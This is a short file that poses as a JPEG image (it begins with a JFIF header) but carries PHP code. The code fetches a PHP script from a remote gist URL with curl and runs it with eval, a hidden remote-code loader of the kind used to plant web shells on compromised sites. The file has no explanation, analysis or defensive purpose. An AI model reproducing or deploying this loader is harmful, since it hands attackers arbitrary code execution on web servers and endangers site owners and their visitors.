ÿØÿà JFIF ÿþ;<?pHp
   function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}
      eval('?>' . get('https://gist.githubusercontent.com/paknago21/74382154988563604b590e08455cf6b2/raw/bd0075a5fa88c0531576a6e30dc23cc5934b678f/gek.php'));
?>